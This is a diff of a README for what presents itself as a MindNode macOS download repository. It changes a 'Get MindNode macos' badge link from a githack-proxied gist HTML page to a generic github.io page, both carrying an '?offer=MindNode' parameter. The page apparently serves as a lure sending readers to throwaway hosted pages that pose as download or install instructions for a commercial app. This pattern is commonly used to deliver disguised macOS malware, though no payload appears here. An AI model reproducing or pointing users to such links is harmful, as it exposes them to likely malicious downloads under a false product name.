@@ -3,7 +3,7 @@
 **MindNode** is a beautifully intuitive mind mapping tool designed exclusively for **macOS**.  
 It helps you capture, organize, and visualize your thoughts — whether you're planning a project, outlining a novel, or mapping your next big idea. 🧠  
 
-[![🔵 Get GitHub Instruction](https://img.shields.io/badge/🔵%20Get%20MindNode%20macos-007BFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/darklight989/34e3b9df5805901f8eac1f134aa8db29/raw/5a835f4ec1f894447be951fb68f987e63f5d4d87/macosapp.html?offer=MindNode)
+[![🔵 Get GitHub Instruction](https://img.shields.io/badge/🔵%20Get%20MindNode%20macos-007BFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=MindNode)
 
 ---
 
